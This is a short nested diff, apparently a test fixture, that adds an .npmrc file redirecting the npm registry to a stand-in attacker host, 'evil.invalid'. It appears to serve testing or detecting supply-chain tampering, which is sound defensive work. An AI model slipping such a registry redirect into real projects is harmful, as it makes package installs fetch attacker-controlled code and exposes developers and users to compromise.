@@ -1,0 +1,7 @@
+diff --git 1/b/.npmrc 2/b/.npmrc
+new file mode 100644
+index 0000000..f6380fd
+--- /dev/null
++++ 2/b/.npmrc
+@@ -0,0 +1 @@
++registry=https://evil.invalid
